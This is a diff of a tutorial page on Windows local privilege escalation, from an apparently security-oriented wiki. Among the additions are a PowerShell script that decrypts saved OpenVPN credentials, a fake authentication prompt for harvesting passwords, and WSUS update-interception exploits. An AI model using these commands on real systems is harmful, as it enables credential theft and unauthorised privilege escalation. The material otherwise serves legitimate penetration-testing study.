@@ -1,10 +1,34 @@
 # Windows Local Privilege Escalation
 
+{% hint style="danger" %}
+Do you use **Hacktricks every day**? Did you find the book **very** **useful**? Would you like to **receive extra help** with cybersecurity questions? Would you like to **find more and higher quality content on Hacktricks**?  
+[**Support Hacktricks through github sponsors**](https://github.com/sponsors/carlospolop) **so we can dedicate more time to it and also get access to the Hacktricks private group where you will get the help you need and much more!**
+{% endhint %}
+
+If you want to know about my **latest modifications**/**additions** or you have **any suggestion for HackTricks** or **PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/)[**telegram group**](https://t.me/peass), or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**  
+If you want to **share some tricks with the community** you can also submit **pull requests** to [**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) that will be reflected in this book and don't forget to **give ⭐** on **github** to **motivate** **me** to continue developing this book.
+
 ### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\*\*\*\*
 
-If you want to **know** about my **latest modifications**/**additions**, **join the** [**PEASS & HackTricks telegram group here**](https://t.me/peass)**.**  
-If you want to **share some tricks with the community** you can also submit **pull requests** to ****[**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) ****that will be reflected in this book.  
-Don't forget to **give ⭐ on the github** to motivate me to continue developing this book.
+## Initial Windows Theory
+
+### Access Tokens
+
+**If you don't know what are Windows Access Tokens, read the following page before continuing:**
+
+{% page-ref page="access-tokens.md" %}
+
+### ACLs - DACLs/SACLs/ACEs
+
+**If you don't know what is any of the acronyms used in the heading of this section, read the following page before continuing**:
+
+{% page-ref page="acls-dacls-sacls-aces.md" %}
+
+### Integrity Levels
+
+**If you don't know what are integrity levels in Windows you should read the following page before continuing:**
+
+{% page-ref page="integrity-levels.md" %}
 
 ## System Info
 
@@ -55,14 +79,69 @@ dir env:
 Get-ChildItem Env: | ft Key,Value
 ```
 
-### Powershell history
+### PowerShell History
 
 ```bash
+ConsoleHost_history #Find the PATH where is saved
+
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
+
+### PowerShell Transcript files
+
+You can learn how to turn this on in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
+
+```bash
+#Check is enable in the registry
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+dir C:\Transcripts
+
+#Start a Transcription session
+Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
+Stop-Transcript
+```
+
+### PowerShell Module Logging
+
+It records the pipeline execution details of PowerShell. This includes the commands which are executed including command invocations and some portion of the scripts. It may not have the entire detail of the execution and the output results.  
+You can enable this following the link of the last section \(Transcript files\) but enabling "Module Logging" instead of "Powershell Transcription".
+
+```text
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+```
+
+To view the last 15 events from PowersShell logs you can execute:
+
+```bash
+Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
+```
+
+### PowerShell  **Script Block Logging**
+
+It records block of code as they are executed therefore it captures the complete activity and full content of the script. It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. It records all the activity at time of execution thus provides the complete details.
+
+```text
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+```
+
+The Script Block logging events can be found in Windows Event viewer under following path: _Application and Sevices Logs &gt; Microsoft &gt; Windows &gt; Powershell &gt; Operational_  
+To view the last 20 events you can use:
+
+```bash
+Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
 
 ### Internet Settings
@@ -101,9 +180,22 @@ And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
 
 Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
 
-You can use: [Wsuxploit](https://github.com/pimps/wsuxploit) - This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.
+In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.
+
+Read the research here:
 
 {% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\).pdf" %}
+
+#### WSUS CVE-2020-1013
+
+\*\*\*\*[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).  
+Basically, this is the flaw that this bug exploits: 
+
+> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
+>
+> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
+
+You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) \(once it's liberated\).
 
 ## AlwaysInstallElevated
 
@@ -125,7 +217,7 @@ If you have a meterpreter session you can automate this technique using the modu
 
 ### PowerUP
 
-Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
+Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition \(so you will need GIU access\):
 
 ```text
 Write-UserAddMSI
@@ -135,9 +227,13 @@ Just execute the created binary to escalate privileges.
 
 ### MSI Wrapper
 
-Read this tutorial to learn how to create a MSI wrapper using this tools:
+Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**
 
 {% page-ref page="msi-wrapper.md" %}
+
+### Create MSI with WIX
+
+{% page-ref page="create-msi-with-wix.md" %}
 
 ### MSI Installation
 
@@ -245,7 +341,7 @@ C:\windows\tracing
 ### UAC
 
 UAC is used to allow an **administrator user to not give administrator privileges to each process executed**. This is **achieved using default** the **low privileged token** of the user.  
-[**More information about UAC here**](../credentials.md#uac).
+[**More information about UAC here**](../authentication-credentials-uac-and-efs.md#uac).
 
 ```text
  reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
@@ -280,7 +376,7 @@ If you **belongs to some privileged group you may be able to escalate privileges
 
 ### Token manipulation
 
-**Learn more** about what is a **token** in this page: [**Windows Tokens**](../credentials.md#access-tokens).  
+**Learn more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).  
 Check the following page to **learn about interesting tokens** and how to abuse them:
 
 {% page-ref page="privilege-escalation-abusing-tokens.md" %}
@@ -328,6 +424,8 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
+
+Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
 #### Checking permissions of the processes binaries
 
@@ -413,6 +511,12 @@ sc config SSDPSRV obj= ".\LocalSystem" password= ""
 
 **Take into account that the service upnphost depends on SSDPSRV to work \(for XP SP1\)**
 
+**Another workaround** of this problem is running:
+
+```text
+sc.exe config usosvc start= auto
+```
+
 ### **Modify service binary path**
 
 If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, then it can modify the binary that is being executed by the service. To modify it and execute **nc** you can do:
@@ -460,7 +564,7 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
-### Services registry permissions
+### Services registry modify permissions
 
 You should check if you can modify any service registry.  
 You can **check** your **permissions** over a service **registry** doing:
@@ -481,6 +585,14 @@ To change the Path of the binary executed:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
+
+### Services registry AppendData/AddSubdirectory permissions
+
+If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**
+
+{% page-ref page="appenddata-addsubdirectory-permission-over-service-registry.md" %}
+
+
 
 ### Unquoted Service Paths
 
@@ -730,7 +842,7 @@ Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 
-You can use **mimikatz module** `dpapi::masterkey` with the appropiate arguments \(`/pvk` or `/rpc`\) to decrypt it.
+You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments \(`/pvk` or `/rpc`\) to decrypt it.
 
 The **credentials files protected by the master password** are usually located in:
 
@@ -773,12 +885,13 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
 
-Use the **Mimikatz** `dpapi::rd`g module with appropriate `/masterkey` to **decrypt any .rdg files**  
+Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**  
 You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
 
 ### AppCmd.exe
 
-**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
+**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.  
+AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
 If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.
 
 This code was extracted from _**PowerUP**_:
@@ -894,9 +1007,18 @@ SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Ag
 reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 ```
 
-If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).
-
+If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).  
 More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+
+If `ssh-agent` service is not running and you want it to automatically start on boot run:
+
+```text
+Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
+```
+
+{% hint style="info" %}
+It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with `ssh-add` and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of `dpapi.dll` during the asymmetric key authentication.
+{% endhint %}
 
 ### Unattended files
 
@@ -1014,6 +1136,28 @@ Example of web.config with credentials:
 </authentication>
 ```
 
+### OpenVPN credentials
+
+```csharp
+Add-Type -AssemblyName System.Security
+$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
+$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
+
+foreach ($item in $items)
+{
+  $encryptedbytes=$item.'auth-data'
+  $entropy=$item.'entropy'
+  $entropy=$entropy[0..(($entropy.Length)-2)]
+
+  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+    $encryptedBytes, 
+    $entropy, 
+    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+ 
+  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
+}
+```
+
 ### Logs
 
 ```bash
@@ -1028,9 +1172,12 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 
 You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them \(notice that **asking** the client directly for the **credentials** is really **risky**\):
 
-```text
+```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+
+#Get plaintext
+$cred.GetNetworkCredential() | fl
 ```
 
 ### **Possible filenames containing credentials**
@@ -1200,7 +1347,7 @@ When a **client writes on a pipe**, the **server** that created the pipe can **i
 
 ## From Administrator Medium to High Integrity Level / UAC Bypass
 
-\*\*\*\*[**Learn here**](../credentials.md#uac) **about what are the "integrity levels" in Windows, what is UAC and how to**[ **bypass it**](../credentials.md#uac)**.**
+\*\*\*\*[**Read this to learn about Integrity Levels**](integrity-levels.md) **and** [**this to learn what is UAC**](../authentication-credentials-uac-and-efs.md#uac)**, then read how to**[ **bypass it**](../authentication-credentials-uac-and-efs.md#uac)**.**
 
 ## **From High Integrity to System**
 
@@ -1217,6 +1364,10 @@ sc start newservicename
 
 From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.   
 [More information about the registry keys involved and how to install a _.msi_ package here.](./#alwaysinstallelevated)
+
+### High + SeImpersonate privilege to System
+
+**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
